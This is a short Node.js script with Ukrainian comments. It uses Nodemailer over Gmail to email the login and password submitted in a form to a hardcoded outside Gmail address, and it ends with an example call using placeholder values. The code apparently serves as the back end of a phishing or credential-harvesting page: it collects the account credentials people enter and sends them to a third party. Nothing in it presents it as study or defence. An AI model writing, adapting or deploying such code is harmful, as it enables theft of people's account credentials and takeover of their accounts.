const nodemailer = require('nodemailer');

// Конфігурація Nodemailer
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'твоя_електронна_пошта@gmail.com', // Введи свою електронну адресу
    pass: 'твій_пароль' // Введи свій пароль
  }
});

// Функція для відправлення листа
function sendEmail(email, password) {
  // Надсилання електронної пошти
  const mailOptions = {
    from: 'твоя_електронна_пошта@gmail.com', // Введи свою електронну адресу
    to: 'kolyadkon35@gmail.com', // Електронна адреса, на яку надійде лист
    subject: 'Нові дані форми',
    text: `Логін: ${email}, Пароль: ${password}`
  };

  transporter.sendMail(mailOptions, function(error, info){
    if (error) {
      console.log(error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });
}

// Приклад виклику функції для надсилання листа
const email = 'example@example.com'; // Введи тут електронну пошту з форми
const password = 'examplePassword'; // Введи тут пароль з форми
sendEmail(email, password);
